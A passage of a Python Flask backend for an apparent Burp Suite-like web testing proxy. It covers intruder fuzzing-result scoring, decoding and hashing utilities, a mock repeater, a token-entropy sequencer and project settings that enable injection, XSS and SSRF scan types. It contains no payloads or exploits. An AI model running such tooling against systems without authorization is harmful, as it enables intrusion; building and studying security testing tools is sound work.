    response_time = result.get('response_time', 0)
    if response_time > 2.0:  # More than 2 seconds
        return True

    # Check response size
    response_size = result.get('length', 0)
    if response_size > 1000000:  # More than 1MB
        return True
    elif response_size < 100:  # Very small response
        return True

    # Check for grep matches
    analysis = result.get('analysis', {})
    if analysis.get('grep_matches'):
        return True

    # Check for extracted data
    if analysis.get('extracted'):
        return True

    # Check for unusual status codes
    if status_code not in [200, 201, 204, 301, 302, 304, 400, 404]:
        return True

    return False


def identify_interesting_results(results: List[Dict], job_data: Dict) -> List[Dict]:
    """Identify and rank interesting results"""
    interesting = []

    for i, result in enumerate(results):
        if not is_interesting_response(result):
            continue

        # Calculate interest score
        interest_score = 0

        # Status code weight
        status_code = result.get('status_code', 0)
        if status_code >= 500:
            interest_score += 30
        elif status_code in [401, 403]:
            interest_score += 20
        elif status_code not in [200, 201, 204, 301, 302, 304, 400, 404]:
            interest_score += 10

        # Response time weight
        response_time = result.get('response_time', 0)
        if response_time > 5.0:
            interest_score += 25
        elif response_time > 2.0:
            interest_score += 15
        elif response_time > 1.0:
            interest_score += 5

        # Response size weight
        response_size = result.get('length', 0)
        if response_size > 5000000:  # >5MB
            interest_score += 20
        elif response_size > 1000000:  # >1MB
            interest_score += 10
        elif response_size < 100:  # Very small
            interest_score += 10

        # Grep matches weight
        analysis = result.get('analysis', {})
        if analysis.get('grep_matches'):
            interest_score += len(analysis['grep_matches']) * 5

        # Extracted data weight
        if analysis.get('extracted'):
            interest_score += len(analysis['extracted']) * 3

        # Get corresponding payload
        payload_index = min(i, len(job_data.get('payloads', [])) - 1)
        payload = job_data.get('payloads', [])[payload_index] if payload_index >= 0 else "Unknown"

        interesting.append({
            "index": i,
            "payload": payload[:100] + ("..." if len(payload) > 100 else ""),
            "status_code": status_code,
            "response_time": round(response_time * 1000, 2),
            "response_size": response_size,
            "grep_matches": analysis.get('grep_matches', []),
            "extracted_data": analysis.get('extracted', []),
            "interest_score": interest_score,
            "analysis": get_response_analysis(result)
        })

    # Sort by interest score
    interesting.sort(key=lambda x: x["interest_score"], reverse=True)
    return interesting


def get_response_analysis(result: Dict) -> str:
    """Generate analysis text for a response"""
    analysis_parts = []

    status_code = result.get('status_code', 0)

    if status_code == 0:
        analysis_parts.append("Request failed to complete")
    elif status_code >= 500:
        analysis_parts.append("Server error")
    elif status_code == 401:
        analysis_parts.append("Unauthorized")
    elif status_code == 403:
        analysis_parts.append("Forbidden")
    elif status_code == 404:
        analysis_parts.append("Not found")
    elif 200 <= status_code < 300:
        analysis_parts.append("Success")

    response_time = result.get('response_time', 0)
    if response_time > 5.0:
        analysis_parts.append("Very slow response")
    elif response_time > 2.0:
        analysis_parts.append("Slow response")

    response_size = result.get('length', 0)
    if response_size > 1000000:
        analysis_parts.append("Large response")
    elif response_size < 100:
        analysis_parts.append("Very small response")

    analysis = result.get('analysis', {})
    if analysis.get('grep_matches'):
        analysis_parts.append(f"Grep matches: {len(analysis['grep_matches'])}")

    if analysis.get('extracted'):
        analysis_parts.append(f"Extracted data: {len(analysis['extracted'])} items")

    return "; ".join(analysis_parts) if analysis_parts else "Normal response"


def format_results_preview(results: List[Dict]) -> List[Dict]:
    """Format a preview of results for API response"""
    preview = []

    for i, result in enumerate(results):
        preview.append({
            "request_number": i + 1,
            "status_code": result.get('status_code', 0),
            "response_time_ms": round(result.get('response_time', 0) * 1000, 2),
            "response_size": result.get('length', 0),
            "has_grep_matches": bool(result.get('analysis', {}).get('grep_matches')),
            "has_extracted_data": bool(result.get('analysis', {}).get('extracted')),
            "analysis": get_response_analysis(result)
        })

    return preview


def count_payload_positions(target_url: str, body_template: str) -> int:
    """Count number of payload positions in target"""
    positions = 0

    # Count in URL
    positions += target_url.count('§')

    # Count in body template
    positions += body_template.count('§')

    return positions // 2  # Each position has opening and closing §


def calculate_total_combinations(payload_sets):
    """Calculate total combinations for cluster bomb attack"""
    if not payload_sets or not isinstance(payload_sets, list):
        return 0

    total = 1
    for payload_set in payload_sets:
        if isinstance(payload_set, list):
            total *= len(payload_set)
        else:
            total *= 1

    return total


@app.route("/api/intruder/job/<job_id>/results")
def api_intruder_job_results(job_id):
    """Get detailed results for a specific job with pagination"""
    try:
        # Get pagination parameters
        page = request.args.get('page', 1, type=int)
        per_page = request.args.get('per_page', 50, type=int)
        offset = (page - 1) * per_page

        with DB.cursor() as cur:
            # Get job to access results
            row = cur.execute("""
                SELECT results, payloads, status
                FROM intruder_jobs 
                WHERE id=?
            """, (job_id,)).fetchone()

            if not row:
                return jsonify({
                    "success": False,
                    "error": "Job not found"
                }), 404

            results = json.loads(row[0]) if row[0] else []
            payloads = json.loads(row[1]) if row[1] else []
            job_status = row[2]

            # Apply filters if provided
            filtered_results = apply_results_filters(results, request.args)

            # Paginate results
            total_results = len(filtered_results)
            total_pages = (total_results + per_page - 1) // per_page
            paginated_results = filtered_results[offset:offset + per_page]

            # Format detailed results
            detailed_results = []
            for i, result in enumerate(paginated_results):
                result_index = offset + i
                payload = payloads[result_index] if result_index < len(payloads) else "Unknown"

                detailed_results.append({
                    "request_number": result_index + 1,
                    "payload": payload,
                    "status_code": result.get('status_code', 0),
                    "response_time_ms": round(result.get('response_time', 0) * 1000, 2),
                    "response_size": result.get('length', 0),
                    "grep_matches": result.get('analysis', {}).get('grep_matches', []),
                    "extracted_data": result.get('analysis', {}).get('extracted', []),
                    "raw_result": result  # Include full result for advanced analysis
                })

            return jsonify({
                "success": True,
                "job_id": job_id,
                "job_status": job_status,
                "pagination": {
                    "page": page,
                    "per_page": per_page,
                    "total_results": total_results,
                    "total_pages": total_pages,
                    "has_next": page < total_pages,
                    "has_previous": page > 1
                },
                "filters_applied": get_applied_filters(request.args),
                "results": detailed_results
            })

    except Exception as e:
        print(f"Error getting job results: {e}")
        return jsonify({
            "success": False,
            "error": "Failed to retrieve results",
            "message": str(e)
        }), 500


def apply_results_filters(results: List[Dict], args) -> List[Dict]:
    """Apply filters to results based on query parameters"""
    filtered = results.copy()

    # Filter by status code
    status_code = args.get('status_code', type=int)
    if status_code is not None:
        filtered = [r for r in filtered if r.get('status_code', 0) == status_code]

    # Filter by min response time
    min_time = args.get('min_time', type=float)
    if min_time is not None:
        filtered = [r for r in filtered if r.get('response_time', 0) >= min_time]

    # Filter by max response time
    max_time = args.get('max_time', type=float)
    if max_time is not None:
        filtered = [r for r in filtered if r.get('response_time', 0) <= max_time]

    # Filter by grep match
    grep_match = args.get('grep_match')
    if grep_match:
        filtered = [r for r in filtered if grep_match in r.get('analysis', {}).get('grep_matches', [])]

    # Filter by has extracted data
    has_extracted = args.get('has_extracted', type=lambda x: x.lower() == 'true')
    if has_extracted is not None:
        if has_extracted:
            filtered = [r for r in filtered if r.get('analysis', {}).get('extracted')]
        else:
            filtered = [r for r in filtered if not r.get('analysis', {}).get('extracted')]

    # Sort results
    sort_by = args.get('sort_by', 'request_number')
    sort_order = args.get('sort_order', 'asc')

    if sort_by == 'status_code':
        filtered.sort(key=lambda x: x.get('status_code', 0), reverse=(sort_order == 'desc'))
    elif sort_by == 'response_time':
        filtered.sort(key=lambda x: x.get('response_time', 0), reverse=(sort_order == 'desc'))
    elif sort_by == 'response_size':
        filtered.sort(key=lambda x: x.get('length', 0), reverse=(sort_order == 'desc'))

    return filtered


def get_applied_filters(args):
    """Get list of applied filters for response"""
    filters = []

    if args.get('status_code'):
        filters.append(f"status_code={args.get('status_code')}")
    if args.get('min_time'):
        filters.append(f"min_time={args.get('min_time')}")
    if args.get('max_time'):
        filters.append(f"max_time={args.get('max_time')}")
    if args.get('grep_match'):
        filters.append(f"grep_match={args.get('grep_match')}")
    if args.get('has_extracted'):
        filters.append(f"has_extracted={args.get('has_extracted')}")

    return filters


@app.route("/api/decoder", methods=["POST"])
def api_decoder():
    """Decode/encode data"""
    data = request.json
    operation = data.get('operation')
    input_data = data.get('input', '')

    processor = DataProcessor()
    result = ''
    error = None

    try:
        if operation == 'base64_encode':
            result = processor.encode_base64(input_data)
        elif operation == 'base64_decode':
            result = processor.decode_base64(input_data)
        elif operation == 'url_encode':
            result = processor.url_encode(input_data)
        elif operation == 'url_decode':
            result = processor.url_decode(input_data)
        elif operation == 'html_encode':
            result = processor.html_encode(input_data)
        elif operation == 'html_decode':
            result = processor.html_decode(input_data)
        elif operation == 'hex_encode':
            result = processor.hex_encode(input_data)
        elif operation == 'hex_decode':
            result = processor.hex_decode(input_data)
        elif operation == 'md5':
            result = processor.calculate_hash(input_data, 'md5')
        elif operation == 'sha1':
            result = processor.calculate_hash(input_data, 'sha1')
        elif operation == 'sha256':
            result = processor.calculate_hash(input_data, 'sha256')
        elif operation == 'json_beautify':
            result = processor.json_beautify(input_data)
        elif operation == 'xml_beautify':
            result = processor.xml_beautify(input_data)
        elif operation == 'rot13':
            result = processor.rot13(input_data)
        elif operation == 'jwt_decode':
            result = json.dumps(processor.jwt_decode(input_data), indent=2)
        else:
            error = f"Unknown operation: {operation}"
    except Exception as e:
        error = str(e)

    return jsonify({"result": result, "error": error})


@app.route("/api/repeater/send", methods=["POST"])
def api_repeater_send():
    """Send request through repeater"""
    data = request.json

    # Simplified - just return mock response
    response = {
        "status": "sent",
        "response": {
            "status_code": 200,
            "headers": [
                ["Content-Type", "application/json"],
                ["Server", "nginx/1.18.0"]
            ],
            "body": json.dumps({"message": "Mock response", "timestamp": datetime.now().isoformat()}, indent=2),
            "time": 0.245
        }
    }

    return jsonify(response)


@app.route("/api/comparer/compare", methods=["POST"])
def api_comparer_compare():
    """Compare two data sets"""
    data = request.json
    left = data.get('left', '')
    right = data.get('right', '')

    # Simple comparison
    left_lines = left.split('\n')
    right_lines = right.split('\n')

    diff = []
    max_len = max(len(left_lines), len(right_lines))

    for i in range(max_len):
        left_line = left_lines[i] if i < len(left_lines) else ''
        right_line = right_lines[i] if i < len(right_lines) else ''

        if left_line != right_line:
            diff.append({
                "line": i + 1,
                "left": left_line,
                "right": right_line
            })

    return jsonify({
        "different": len(diff) > 0,
        "diff_count": len(diff),
        "diffs": diff[:100]  # Limit output
    })


@app.route("/api/sequencer/analyze", methods=["POST"])
def api_sequencer_analyze():
    """Analyze token randomness"""
    data = request.json
    tokens = data.get('tokens', [])

    if not tokens:
        return jsonify({"error": "No tokens provided"}), 400

    # Calculate basic statistics
    token_lengths = [len(t) for t in tokens]

    analysis = {
        "total_tokens": len(tokens),
        "unique_tokens": len(set(tokens)),
        "avg_length": sum(token_lengths) / len(token_lengths),
        "min_length": min(token_lengths),
        "max_length": max(token_lengths),
        "character_entropy": _calculate_entropy(''.join(tokens)),
        "recommendation": "Tokens appear random" if len(set(tokens)) == len(tokens) else "Potential patterns detected"
    }

    return jsonify(analysis)


def _calculate_entropy(text):
    """Calculate Shannon entropy"""
    if not text:
        return 0

    counter = Counter(text)
    total = len(text)

    entropy = 0
    for count in counter.values():
        probability = count / total
        entropy -= probability * math.log2(probability)

    return entropy


@app.route("/api/projects")
def api_projects():
    """Get projects list"""
    with DB.cursor() as cur:
        rows = cur.execute("SELECT DISTINCT project FROM requests").fetchall()
        projects = [row[0] for row in rows if row[0]]

        if "Default" not in projects:
            projects.insert(0, "Default")

    return jsonify({
        "projects": projects,
        "active": GLOBAL.active_project['name']
    })


@app.route("/api/project/switch", methods=["POST"])
def api_project_switch():
    """Switch to a different project with full context loading"""
    try:
        data = request.json
        if not data:
            return jsonify({
                "success": False,
                "error": "No data provided"
            }), 400

        project_name = data.get('name', 'Default').strip()

        if not project_name:
            return jsonify({
                "success": False,
                "error": "Project name is required"
            }), 400

        # Check if project exists or create it
        with DB.cursor() as cur:
            # First, verify project exists or create it
            existing_project = cur.execute(
                "SELECT COUNT(*) FROM requests WHERE project = ? LIMIT 1",
                (project_name,)
            ).fetchone()[0] > 0

            # Load or create project configuration
            project_config = load_or_create_project_config(project_name, cur)

            # Update global state
            previous_project = GLOBAL.active_project['name']

            GLOBAL.active_project = {
                'name': project_name,
                'scope': project_config.get('scope', []),
                'excluded': project_config.get('excluded', []),
                'settings': project_config.get('settings', {}),
                'created': project_config.get('created'),
                'updated': datetime.now(timezone.utc).isoformat(),
                'description': project_config.get('description', ''),
                'tags': project_config.get('tags', []),
                'exists_in_db': existing_project
            }

            # Load project statistics
            stats = get_project_statistics(project_name, cur)

            # Log the project switch (for audit trail)
            log_project_switch(previous_project, project_name, cur)

            return jsonify({
                "success": True,
                "project": {
                    "name": project_name,
                    "display_name": project_config.get('display_name', project_name),
                    "description": project_config.get('description', ''),
                    "created": project_config.get('created'),
                    "updated": GLOBAL.active_project['updated'],
                    "exists_in_db": existing_project,
                    "configuration": {
                        "scope": GLOBAL.active_project['scope'],
                        "excluded": GLOBAL.active_project['excluded'],
                        "settings": GLOBAL.active_project['settings']
                    },
                    "statistics": stats,
                    "tags": project_config.get('tags', [])
                },
                "message": f"Switched to project '{project_name}'"
            })

    except Exception as e:
        print(f"Project switch error: {e}")
        return jsonify({
            "success": False,
            "error": "Failed to switch project",
            "message": str(e)
        }), 500


def load_or_create_project_config(project_name: str, cur) -> Dict:
    """Load existing project config or create default config"""

    # Try to load existing config
    row = cur.execute("""
        SELECT scope, excluded_paths, custom_headers, scan_config, 
               created, description, display_name, tags, settings
        FROM project_config 
        WHERE project_name = ?
    """, (project_name,)).fetchone()

    if row:
        # Parse existing configuration
        config = {
            'scope': json.loads(row[0]) if row[0] else [],
            'excluded': json.loads(row[1]) if row[1] else [],
            'custom_headers': json.loads(row[2]) if row[2] else {},
            'scan_config': json.loads(row[3]) if row[3] else {},
            'created': row[4],
            'description': row[5] or f"Project {project_name}",
            'display_name': row[6] or project_name,
            'tags': json.loads(row[7]) if row[7] else [],
            'settings': json.loads(row[8]) if row[8] else {}
        }

        # Ensure required fields exist
        if not config['settings']:
            config['settings'] = get_default_project_settings()

        return config
    else:
        # Create default configuration
        default_config = {
            'scope': [],  # Empty scope means all URLs
            'excluded': [],
            'custom_headers': {},
            'scan_config': get_default_scan_config(),
            'created': datetime.now(timezone.utc).isoformat(),
            'description': f"Project {project_name}",
            'display_name': project_name,
            'tags': ['new'],
            'settings': get_default_project_settings()
        }

        # Save default config to database
        try:
            cur.execute("""INSERT INTO project_config 
                        (project_name, scope, excluded_paths, custom_headers, 
                         scan_config, created, description, display_name, tags, settings)
                        VALUES (?,?,?,?,?,?,?,?,?,?)""",
                        (project_name,
                         json.dumps(default_config['scope']),
                         json.dumps(default_config['excluded']),
                         json.dumps(default_config['custom_headers']),
                         json.dumps(default_config['scan_config']),
                         default_config['created'],
                         default_config['description'],
                         default_config['display_name'],
                         json.dumps(default_config['tags']),
                         json.dumps(default_config['settings'])))
        except sqlite3.IntegrityError:
            # Config might have been created by another thread
            pass

        return default_config


def get_default_project_settings() -> Dict:
    """Get default project settings"""
    return {
        "proxy": {
            "intercept_requests": True,
            "intercept_responses": False,
            "ssl_inspection": True,
            "auto_scroll": True,
            "match_and_replace": [],
            "exclude_from_proxy": []
        },
        "scanner": {
            "active_scanning": True,
            "passive_scanning": True,
            "scan_speed": "medium",
            "max_depth": 5,
            "excluded_parameters": ["sessionid", "csrftoken"],
            "scan_types": {
                "sqli": True,
                "xss": True,
                "command_injection": True,
                "path_traversal": True,
                "xxe": True,
                "ssrf": True,
                "idor": True
            }
        },
        "intruder": {
            "max_threads": 10,
            "request_timeout": 30,
            "retry_failed": True,
            "max_retries": 3,
            "follow_redirects": True,
            "throttle_delay": 0,
            "auto_save_results": True
        },
        "repeater": {
            "auto_follow_redirects": True,
            "update_content_length": True,
            "pretty_print_json": True,
            "highlight_differences": True
        },
        "collaborator": {
            "polling_enabled": False,
            "poll_interval": 60
        },
        "export": {
            "format": "json",
            "include_headers": True,
            "include_body": True,
            "compress_files": False
        },
        "ui": {
            "theme": "light",
            "highlight_color": "#ff6b6b",
            "font_size": 14,
            "show_images": False,
            "auto_refresh": True
        }
    }


def get_default_scan_config() -> Dict:
    """Get default scan configuration"""
    return {
        "scan_type": "comprehensive",
        "depth": "medium",
        "crawl_max_pages": 100,
        "check_types": {
            "sqli": True,
            "xss": True,
            "command_injection": True,
            "path_traversal": True,
            "xxe": True,
            "ssrf": True,
            "idor": True,
            "csrf": True,
            "cors": True,
            "security_headers": True,
            "info_disclosure": True
        },
        "excluded_paths": [
            "/logout",
            "/delete",
            "/admin/delete"
        ],
        "custom_headers": {
            "User-Agent": "BurpSuitePro/2.1 Security Scanner"
        },
        "throttling": {
            "requests_per_second": 10,
            "max_concurrent": 5
        }
    }


def get_project_statistics(project_name: str, cur) -> Dict:
    """Get comprehensive project statistics"""

    # Get basic counts
    stats_query = cur.execute("""
        SELECT 
            COUNT(*) as total_requests,
            COUNT(DISTINCT host) as unique_hosts,
            COUNT(DISTINCT method) as unique_methods,
            SUM(CASE WHEN response_code >= 200 AND response_code < 300 THEN 1 ELSE 0 END) as successful_requests,
            SUM(CASE WHEN response_code >= 400 THEN 1 ELSE 0 END) as failed_requests,
            AVG(response_time) as avg_response_time,
            SUM(request_size + response_size) as total_data_transferred,
            MIN(timestamp) as first_request,
            MAX(timestamp) as last_request
        FROM requests 
        WHERE project = ?
    """, (project_name,)).fetchone()

    # Get scanner results
    scanner_stats = cur.execute("""
        SELECT 
            COUNT(*) as total_issues,
            SUM(CASE WHEN severity = 'Critical' THEN 1 ELSE 0 END) as critical,
            SUM(CASE WHEN severity = 'High' THEN 1 ELSE 0 END) as high,
            SUM(CASE WHEN severity = 'Medium' THEN 1 ELSE 0 END) as medium,
            SUM(CASE WHEN severity = 'Low' THEN 1 ELSE 0 END) as low,
            SUM(CASE WHEN fixed = 1 THEN 1 ELSE 0 END) as fixed,
            SUM(CASE WHEN false_positive = 1 THEN 1 ELSE 0 END) as false_positives
        FROM scanner_results 
        WHERE project = ?
    """, (project_name,)).fetchone()

    # Get intruder jobs
    intruder_stats = cur.execute("""
        SELECT 
            COUNT(*) as total_jobs,
            SUM(CASE WHEN status = 'Completed' THEN 1 ELSE 0 END) as completed,
            SUM(CASE WHEN status = 'Running' THEN 1 ELSE 0 END) as running,
            SUM(payload_count) as total_payloads,
            AVG(progress) as avg_progress
        FROM intruder_jobs 
        WHERE project = ?
    """, (project_name,)).fetchone()

    # Get most active hosts
    top_hosts = cur.execute("""
        SELECT host, COUNT(*) as request_count
        FROM requests 
        WHERE project = ?
        GROUP BY host
        ORDER BY request_count DESC
        LIMIT 5
    """, (project_name,)).fetchall()

    # Get recent activity
    recent_activity = cur.execute("""
        SELECT timestamp, method, host, path, response_code
        FROM requests 
        WHERE project = ?
        ORDER BY timestamp DESC
        LIMIT 10
    """, (project_name,)).fetchall()

    # Format statistics
    stats = {
        "overview": {
            "total_requests": stats_query['total_requests'] or 0,
            "unique_hosts": stats_query['unique_hosts'] or 0,
            "unique_methods": stats_query['unique_methods'] or 0,
            "success_rate": round(
                (stats_query['successful_requests'] or 0) / max(stats_query['total_requests'] or 1, 1) * 100,
                1
            ),
            "avg_response_time_ms": round((stats_query['avg_response_time'] or 0) * 1000, 2),
            "total_data_mb": round((stats_query['total_data_transferred'] or 0) / (1024 * 1024), 2),
            "time_span": calculate_time_span(stats_query['first_request'], stats_query['last_request'])
        },
        "security": {
            "total_issues": scanner_stats['total_issues'] or 0,
            "by_severity": {
                "critical": scanner_stats['critical'] or 0,
                "high": scanner_stats['high'] or 0,
                "medium": scanner_stats['medium'] or 0,
                "low": scanner_stats['low'] or 0
            },
            "fixed_issues": scanner_stats['fixed'] or 0,
            "false_positives": scanner_stats['false_positives'] or 0,
            "remediation_rate": round(
                (scanner_stats['fixed'] or 0) / max(scanner_stats['total_issues'] or 1, 1) * 100,
                1
            ) if scanner_stats['total_issues'] else 0
        },
        "tools": {
            "intruder_jobs": {
                "total": intruder_stats['total_jobs'] or 0,
                "completed": intruder_stats['completed'] or 0,
                "running": intruder_stats['running'] or 0,
                "total_payloads": intruder_stats['total_payloads'] or 0,
                "avg_progress": round(intruder_stats['avg_progress'] or 0, 1)
            },
            "repeater_tabs": cur.execute(
                "SELECT COUNT(*) FROM repeater_tabs WHERE project = ?",
                (project_name,)
            ).fetchone()[0] or 0,
            "saved_sessions": cur.execute(
                "SELECT COUNT(*) FROM sessions WHERE project = ?",
                (project_name,)
            ).fetchone()[0] or 0
        },
        "top_hosts": [
            {"host": row['host'], "request_count": row['request_count']}
            for row in top_hosts
        ],
        "recent_activity": [
            {
                "timestamp": row['timestamp'],
                "method": row['method'],
                "host": row['host'],
                "path": row['path'][:50] + ("..." if len(row['path']) > 50 else ""),
                "status": row['response_code']
            }
            for row in recent_activity
        ],
        "performance": {
            "requests_per_hour": calculate_requests_per_hour(project_name, cur),
            "peak_activity": get_peak_activity_time(project_name, cur),
            "most_common_status": get_most_common_status(project_name, cur)
        }
    }

    return stats


def calculate_time_span(first_timestamp: str, last_timestamp: str) -> str:
    """Calculate human-readable time span"""
    if not first_timestamp or not last_timestamp:
        return "N/A"

    try:
        first = datetime.fromisoformat(first_timestamp.replace('Z', '+00:00'))
        last = datetime.fromisoformat(last_timestamp.replace('Z', '+00:00'))

        delta = last - first

        if delta.days > 365:
            years = delta.days // 365
            return f"{years} year{'s' if years > 1 else ''}"
        elif delta.days > 30:
            months = delta.days // 30
            return f"{months} month{'s' if months > 1 else ''}"
        elif delta.days > 0:
            return f"{delta.days} day{'s' if delta.days > 1 else ''}"
        elif delta.seconds > 3600:
            hours = delta.seconds // 3600
            return f"{hours} hour{'s' if hours > 1 else ''}"
        elif delta.seconds > 60:
            minutes = delta.seconds // 60
            return f"{minutes} minute{'s' if minutes > 1 else ''}"
        else:
            return f"{delta.seconds} second{'s' if delta.seconds != 1 else ''}"
    except:
        return "Unknown"


def calculate_requests_per_hour(project_name: str, cur) -> float:
    """Calculate average requests per hour"""
    try:
        row = cur.execute("""
            SELECT COUNT(*) as total_requests,
                   MIN(timestamp) as first_request,
                   MAX(timestamp) as last_request
            FROM requests 
            WHERE project = ?
        """, (project_name,)).fetchone()

        total_requests = row['total_requests'] or 0
        first_request = row['first_request']
        last_request = row['last_request']

        if total_requests < 2 or not first_request or not last_request:
            return 0.0

        first = datetime.fromisoformat(first_request.replace('Z', '+00:00'))
        last = datetime.fromisoformat(last_request.replace('Z', '+00:00'))

        hours = (last - first).total_seconds() / 3600

        return round(total_requests / max(hours, 1), 2) if hours > 0 else 0.0
    except:
        return 0.0


def get_peak_activity_time(project_name: str, cur) -> Dict:
    """Get peak activity time for the project"""
    try:
        # Group by hour of day
        row = cur.execute("""
            SELECT strftime('%H', timestamp) as hour,
                   COUNT(*) as request_count
            FROM requests 
            WHERE project = ?
            GROUP BY strftime('%H', timestamp)
            ORDER BY request_count DESC
            LIMIT 1
        """, (project_name,)).fetchone()

        if row:
            hour = int(row['hour'])
            return {
                "hour": hour,
                "time_range": f"{hour:02d}:00 - {hour:02d}:59",
                "request_count": row['request_count']
            }
    except:
        pass

    return {"hour": 0, "time_range": "Unknown", "request_count": 0}


def get_most_common_status(project_name: str, cur) -> Dict:
    """Get most common HTTP status code"""
    try:
        row = cur.execute("""
            SELECT response_code, COUNT(*) as count
            FROM requests 
            WHERE project = ? AND response_code IS NOT NULL
            GROUP BY response_code
            ORDER BY count DESC
            LIMIT 1
        """, (project_name,)).fetchone()

        if row:
            return {
                "code": row['response_code'],
                "count": row['count'],
                "percentage": round(row['count'] / max(
                    cur.execute("SELECT COUNT(*) FROM requests WHERE project = ?",
                                (project_name,)).fetchone()[0] or 1, 1
                ) * 100, 1)
            }
    except:
        pass

    return {"code": 0, "count": 0, "percentage": 0}


def log_project_switch(previous_project: str, new_project: str, cur):
    """Log project switch for audit trail"""
    try:
        audit_id = str(uuid.uuid4())
        cur.execute("""INSERT INTO project_audit_log 
                    (id, timestamp, user, action, previous_project, new_project, details)
                    VALUES (?,?,?,?,?,?,?)""",
                    (audit_id,
                     datetime.now(timezone.utc).isoformat(),
                     get_current_user(),
                     'project_switch',
                     previous_project,
                     new_project,
                     json.dumps({
                         'user_agent': request.headers.get('User-Agent', 'Unknown'),
                         'ip_address': request.remote_addr,
                         'timestamp': datetime.now(timezone.utc).isoformat()
                     })))
    except Exception as e:
        print(f"Failed to log project switch: {e}")


def get_current_user() -> str:
    """Get current user (simplified - in production would use auth system)"""
    # This is a placeholder - in a real application, you would
    # get this from the authentication system
    return request.remote_addr or "anonymous"


@app.route("/api/project/create", methods=["POST"])
def api_project_create():
    """Create a new project"""
    try:
        data = request.json
        if not data:
            return jsonify({
                "success": False,
                "error": "No data provided"
            }), 400

        project_name = data.get('name', '').strip()
        if not project_name:
            return jsonify({
                "success": False,
                "error": "Project name is required"
            }), 400

        # Validate project name
        if not re.match(r'^[a-zA-Z0-9_\-\s]+$', project_name):
            return jsonify({
                "success": False,
                "error": "Project name can only contain letters, numbers, spaces, hyphens, and underscores"
            }), 400

        # Check if project already exists
        with DB.cursor() as cur:
            existing = cur.execute(
                "SELECT COUNT(*) FROM project_config WHERE project_name = ?",
                (project_name,)
            ).fetchone()[0] > 0

            if existing:
                return jsonify({
                    "success": False,
                    "error": f"Project '{project_name}' already exists"
                }), 409

            # Create project configuration
            config = {
                'scope': data.get('scope', []),
                'excluded': data.get('excluded', []),
                'description': data.get('description', f"Project {project_name}"),
                'display_name': data.get('display_name', project_name),
                'tags': data.get('tags', ['new']),
                'settings': data.get('settings', get_default_project_settings())
            }

            # Save to database
            cur.execute("""INSERT INTO project_config 
                        (project_name, scope, excluded_paths, description, 
                         display_name, tags, settings, created)
                        VALUES (?,?,?,?,?,?,?,?)""",
                        (project_name,
                         json.dumps(config['scope']),
                         json.dumps(config['excluded']),
                         config['description'],
                         config['display_name'],
                         json.dumps(config['tags']),
                         json.dumps(config['settings']),
                         datetime.now(timezone.utc).isoformat()))

            return jsonify({
                "success": True,
                "project": {
                    "name": project_name,
                    "display_name": config['display_name'],
                    "description": config['description'],
                    "created": datetime.now(timezone.utc).isoformat()
                },
                "message": f"Project '{project_name}' created successfully"
            })

    except Exception as e:
        print(f"Project creation error: {e}")
        return jsonify({
            "success": False,
            "error": "Failed to create project",
            "message": str(e)
        }), 500


@app.route("/api/project/<project_name>/update", methods=["POST"])
def api_project_update(project_name: str):
    """Update project configuration"""
    try:
        data = request.json
        if not data:
            return jsonify({
                "success": False,
                "error": "No data provided"
            }), 400

        with DB.cursor() as cur:
            # Check if project exists
            existing = cur.execute(
                "SELECT COUNT(*) FROM project_config WHERE project_name = ?",
                (project_name,)
            ).fetchone()[0] > 0

            if not existing:
                return jsonify({
                    "success": False,
                    "error": f"Project '{project_name}' not found"
                }), 404

            # Get existing config
            row = cur.execute("""
                SELECT scope, excluded_paths, description, display_name, 
                       tags, settings, scan_config, custom_headers
                FROM project_config 
                WHERE project_name = ?
            """, (project_name,)).fetchone()

            existing_config = {
                'scope': json.loads(row[0]) if row[0] else [],
                'excluded': json.loads(row[1]) if row[1] else [],
                'description': row[2] or '',
                'display_name': row[3] or project_name,
                'tags': json.loads(row[4]) if row[4] else [],
                'settings': json.loads(row[5]) if row[5] else {},
                'scan_config': json.loads(row[6]) if row[6] else {},
                'custom_headers': json.loads(row[7]) if row[7] else {}
            }

            # Merge with updates
            updated_config = {**existing_config}

            # Update only provided fields
            if 'scope' in data:
                updated_config['scope'] = data['scope']
            if 'excluded' in data:
                updated_config['excluded'] = data['excluded']
            if 'description' in data:
                updated_config['description'] = data['description']
            if 'display_name' in data:
                updated_config['display_name'] = data['display_name']
            if 'tags' in data:
                updated_config['tags'] = data['tags']
            if 'settings' in data:
                # Deep merge settings
                updated_config['settings'] = deep_merge(
                    existing_config['settings'],
                    data['settings']
                )
            if 'scan_config' in data:
                updated_config['scan_config'] = data['scan_config']
            if 'custom_headers' in data:
                updated_config['custom_headers'] = data['custom_headers']

            # Save updated config
            cur.execute("""UPDATE project_config 
                        SET scope = ?, excluded_paths = ?, description = ?,
                            display_name = ?, tags = ?, settings = ?,
                            scan_config = ?, custom_headers = ?, updated = ?
                        WHERE project_name = ?""",
                        (json.dumps(updated_config['scope']),
                         json.dumps(updated_config['excluded']),
                         updated_config['description'],
                         updated_config['display_name'],
                         json.dumps(updated_config['tags']),
                         json.dumps(updated_config['settings']),
                         json.dumps(updated_config['scan_config']),
                         json.dumps(updated_config['custom_headers']),
                         datetime.now(timezone.utc).isoformat(),
                         project_name))

            # If this is the active project, update global state
            if GLOBAL.active_project['name'] == project_name:
                GLOBAL.active_project.update({
                    'scope': updated_config['scope'],
                    'excluded': updated_config['excluded'],
                    'settings': updated_config['settings']
                })

            return jsonify({
                "success": True,
                "project": {
                    "name": project_name,
                    "display_name": updated_config['display_name'],
                    "description": updated_config['description'],
                    "updated": datetime.now(timezone.utc).isoformat()
                },
                "message": f"Project '{project_name}' updated successfully"
            })

    except Exception as e:
        print(f"Project update error: {e}")
        return jsonify({
            "success": False,
            "error": "Failed to update project",
            "message": str(e)
        }), 500


def deep_merge(base: Dict, updates: Dict) -> Dict:
    """Deep merge two dictionaries"""
    result = base.copy()

    for key, value in updates.items():
        if key in result and isinstance(result[key], dict) and isinstance(value, dict):
            result[key] = deep_merge(result[key], value)
        else:
            result[key] = value

    return result


@app.route("/api/sitemap")
def api_sitemap():
    """Get site map data"""
    with DB.cursor() as cur:
        rows = cur.execute("""
            SELECT host, scheme, port, paths, request_count, last_seen
            FROM sitemap 
            WHERE request_count > 0
            ORDER BY request_count DESC
        """).fetchall()

        sitemap = []
        for row in rows:
            sitemap.append({
                "host": row[0],
                "scheme": row[1],
                "port": row[2],
                "paths": json.loads(row[3]) if row[3] else [],
                "request_count": row[4],
                "last_seen": row[5]
            })

    return jsonify(sitemap)


@app.route("/api/export/<format>")
def api_export(format):
    """Export data in various formats"""
    # Get optional query parameters
    limit = request.args.get('limit', type=int)
    start_date = request.args.get('start_date')
    end_date = request.args.get('end_date')
